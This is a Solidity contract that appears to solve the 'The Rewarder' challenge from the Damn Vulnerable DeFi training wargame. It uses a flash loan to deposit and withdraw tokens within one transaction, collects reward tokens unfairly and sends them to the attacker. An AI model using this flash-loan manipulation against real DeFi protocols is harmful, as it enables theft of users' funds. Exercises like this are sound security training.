pragma solidity ^0.8.0;

import "../../contracts/the-rewarder/TheRewarderPool.sol";
import "../../contracts/the-rewarder/FlashLoanerPool.sol";
import "../../contracts/the-rewarder/RewardToken.sol";
import "../../contracts/DamnValuableToken.sol";

contract RewardDrainer {
   
     
    DamnValuableToken public immutable token;
    TheRewarderPool public immutable rewarder;
    RewardToken public immutable rewardToken;
    FlashLoanerPool public immutable flashLoaner;
    address attacker;
    // ctor
    constructor(address dvt,
                address rewardPool, 
                address reward, 
                address flashLoanPool) {
        token = DamnValuableToken(dvt);
        rewarder = TheRewarderPool(rewardPool);
        rewardToken = RewardToken(reward);
        flashLoaner = FlashLoanerPool(flashLoanPool);
        attacker = msg.sender;
    }

    function performFlashLoan(uint256 amount) public {
        // borrow some amount
        // (this will internally call receiveFlashLoan
        flashLoaner.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        
        // Exploit goes here:
        token.approve(address(rewarder), amount);
        rewarder.deposit(amount);
        rewarder.withdraw(amount);
        uint thisRewardBalance = rewardToken.balanceOf(address(this));
        rewardToken.transfer(attacker, thisRewardBalance);
        // token.transferFrom(address(rewarder), address(this), amount);

        // return exact amount
        token.transfer(address(flashLoaner), amount);
    }
}
